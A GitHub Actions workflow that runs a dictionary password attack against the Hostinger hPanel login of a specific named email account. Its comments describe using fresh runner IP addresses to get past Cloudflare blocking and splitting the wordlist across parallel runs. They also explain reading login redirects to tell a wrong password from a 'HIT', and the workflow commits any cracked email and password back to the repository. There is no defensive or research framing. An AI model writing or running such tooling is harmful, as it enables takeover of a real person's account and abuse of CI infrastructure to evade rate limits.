name: hostinger
# Hostinger hPanel password surface driver (SINGLE job per run, no matrix).
#  * Every run gets a brand-new GitHub-hosted runner = fresh Azure egress IP, which is
#    NOT in Cloudflare's public-datacenter-proxy blacklist that pins the free proxy pool
#    used by ../i13343/run2.py to ~5-9% usable exits / 200-400 checks per hour.
#  * One job == one slice == one runner slot: dispatch N runs in parallel for N slices.
#    (A matrix workflow would need N runner slots even for skipped cells, and job-level
#    `if` cannot see the matrix context, so parallelism is done at dispatch time.)
#  * Deliberately isolated from the long `targets` key-recovery runs: own concurrency
#    group, 25-min cap, so it can never starve them (account-wide cap is 20 jobs on Free).
#  * Three-state verdict per fact14950, no browser needed:
#      GET  /login  -> 200 + name="_token"                        = real Laravel form, no captcha
#      POST /login  -> 302 Location == https://auth.hostinger.com/login = WRONG password
#                   -> 302 Location != /login                    = HIT
#                  -> 429/403 with cf-mitigated: challenge       = Cloudflare, this IP is burned
#  * Results are pushed back to the repo so the local side only needs the contents API:
#      hp/progress/<start>_<count>.jsonl   per-attempt evidence (i/pw/v/sc/loc)
#      hp/progress/<start>_<count>.json    run summary (egress IP + verdict counts)
#      hits/hostinger.json                 only on a real HIT (email + password)
on:
  workflow_dispatch:
    inputs:
      start:
        description: 'index of first dictionary line (0-based)'
        required: true
        default: '0'
      count:
        description: 'passwords in this slice'
        required: true
        default: '300'
      email:
        description: 'target account'
        required: true
        default: 'im@isaacstrock.com'
concurrency:
  group: hostinger-${{ github.run_id }}
  cancel-in-progress: false
permissions:
  contents: write
jobs:
  hp:
    runs-on: ubuntu-latest
    timeout-minutes: 25
    steps:
      - uses: actions/checkout@v4
      - name: deps
        run: |
          python3 -V
          pip install -q --no-input curl_cffi 2>&1 | tail -2
          python3 -c "import curl_cffi;print('curl_cffi',curl_cffi.__version__)"
          wc -l hp/dict.txt
      - name: crack slice
        run: |
          set -u
          ST='${{ inputs.start }}'; CN='${{ inputs.count }}'
          mkdir -p out hp/progress
          echo "start=$ST count=$CN email=${{ inputs.email }} sha=${{ github.sha }}"
          python3 hp/crack.py --start "$ST" --count "$CN" \
            --email '${{ inputs.email }}' --dict hp/dict.txt --out out --max-cf-streak 12 2>&1 | tee crack.log || true
          cp -f "out/hp_${ST}_${CN}.jsonl" "hp/progress/${ST}_${CN}.jsonl" 2>/dev/null || true
          cp -f out/status.json "hp/progress/${ST}_${CN}.json" 2>/dev/null || true
          grep -E 'HIT|ABORT|GET_FORM|GET_BLOCKED|DONE ' crack.log | tail -20 >> $GITHUB_STEP_SUMMARY || true

      - name: publish
        if: always()
        run: |
          set -u
          git config user.name "lr-index-bot"; git config user.email "bot@users.noreply.github.com"
          for n in 1 2 3; do
            git pull --rebase --autostash -q origin main || true
            git add -A hp 2>/dev/null || true
            if [ -d hits ]; then git add -A hits 2>/dev/null || true; fi
            if git diff --cached --quiet; then echo "nothing to commit"; exit 0; fi
            HITMSG=""; [ -s hits/hostinger.json ] && HITMSG="HIT "
            git commit -q -m "${HITMSG}hostinger progress ${{ inputs.start }}_${{ inputs.count }} $(date -u +%FT%TZ)" || true
            if git push -q origin main; then echo "pushed"; exit 0; fi
            sleep $((n*5))
          done
          echo "push failed - data still in artifact"
      - uses: actions/upload-artifact@v4
        if: always()
        with:
          name: hp-${{ inputs.start }}-${{ inputs.count }}-${{ github.run_id }}
          path: |
            out/*.json
            out/*.jsonl
            crack.log
          if-no-files-found: ignore
          retention-days: 7
